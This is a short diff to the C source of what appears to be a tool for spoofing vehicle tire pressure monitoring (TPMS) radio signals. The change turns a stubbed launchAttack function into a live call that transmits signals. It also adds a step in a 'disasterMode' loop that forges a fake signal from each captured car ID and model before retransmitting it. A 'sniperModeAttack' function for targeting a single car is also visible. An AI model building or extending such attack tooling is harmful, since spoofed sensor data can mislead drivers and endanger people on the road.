@@ -29,15 +29,7 @@ void startGUI() {
 }
 
 bool launchAttack(struct tpms_general tpms) {
-    if (!strncmp(tpms.model, "Toyota", strlen("Toyota")))
-        toyotaTPMS(tpms.status, tpms.id, tpms.pressure_KPA, tpms.temperature_C);
-    else if (!strncmp(tpms.model, "Citroen", strlen("Citroen"))) 
-        citroenTPMS(tpms.state, tpms.id, tpms.flags, tpms.repeat, tpms.pressure_KPA, tpms.temperature_C, tpms.maybe_battery);
-    else if (!strncmp(tpms.model, "Renault", strlen("Renault"))) 
-        renaultTPMS(tpms.id, tpms.pressure_KPA, tpms.temperature_C, tpms.flags);
-    
-    return NULL;
-    //return transmitTPMSSignal(tpms);
+    return transmitTPMSSignal(tpms);
 }
 
 void sniperModeAttack(char *id, char *nameCar) {
@@ -260,6 +252,7 @@ void runController() {
                     struct tpms_general str = generalParser(signal_buff);
                     
                     if(disasterMode) {
+                        str = newFakeSignal(str.id, str.model);
                         launchAttack(str);
                         addSignalAll(str);
                     }
